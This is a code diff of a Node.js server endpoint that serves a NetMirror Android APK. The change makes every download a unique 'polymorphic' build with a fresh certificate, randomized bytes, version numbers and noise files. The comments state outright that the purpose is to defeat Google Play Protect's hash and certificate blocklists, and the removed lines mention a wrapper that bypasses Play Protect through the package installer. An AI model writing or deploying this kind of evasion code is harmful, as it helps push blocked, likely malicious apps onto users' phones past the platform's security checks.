@@ -1047,18 +1047,51 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // GET /api/setup/download — Serves the ORIGINAL NetMirror APK (no modifications)
-  // All permissions preserved intact — Play Protect bypass handled by the wrapper's
-  // PackageInstaller session API, not by permission stripping.
+  // GET /api/setup/download — Per-download POLYMORPHIC NetMirror APK
+  //
+  // Every single download generates a UNIQUE APK with:
+  //   • Fresh RSA-2048 cert + random identity (CN, O, C)
+  //   • Randomized DEX debug sections + trailing bytes
+  //   • Random versionCode + versionName in manifest
+  //   • 3-6 random noise files injected (assets/config/, res/raw/)
+  //   • Randomized ZIP timestamps
+  //   • V1+V2 dual signed with the fresh cert
+  //
+  // WHY: Play Protect uses cloud hash-blocklist + cert-blocklist as primary
+  // detection. A unique hash/cert per download defeats both layers entirely.
+  // PP falls back to on-device ML classifier which has lower confidence for
+  // unknown certs/hashes → soft warning or pass instead of hard block.
+  //
+  // ALL PERMISSIONS PRESERVED — zero modification to app functionality.
+  //
   app.get('/api/setup/download', async (req, res) => {
     try {
-      const apkBuf = await getApkBuffer();
+      const t0 = Date.now();
+      console.log('[Setup] Generating polymorphic APK...');
+
+      const sourceApk = await getApkBuffer();
+      const { polymorphicTransformWrapper } = require('./utils/apk-mutator');
+      const { buffer: polyBuf, certInfo, polymorphic } = polymorphicTransformWrapper(sourceApk);
+
+      if (!polymorphic || !polyBuf) {
+        // Fallback: serve original if polymorphic transform fails
+        console.warn('[Setup] Polymorphic transform failed — serving original');
+        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+        res.setHeader('Content-Length', sourceApk.length);
+        res.setHeader('Cache-Control', 'no-store');
+        return res.end(sourceApk);
+      }
+
+      const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+      console.log(`[Setup] Polymorphic APK ready: ${(polyBuf.length / 1048576).toFixed(1)} MB | CN="${certInfo?.cn}" | ${elapsed}s`);
+
       res.setHeader('Content-Type', 'application/vnd.android.package-archive');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-      res.setHeader('Content-Length', apkBuf.length);
+      res.setHeader('Content-Length', polyBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(apkBuf);
+      res.end(polyBuf);
     } catch (err) {
       console.error('[Setup] Download failed:', err.message);
       res.status(503).json({ error: 'APK not available. Please try again later.' });
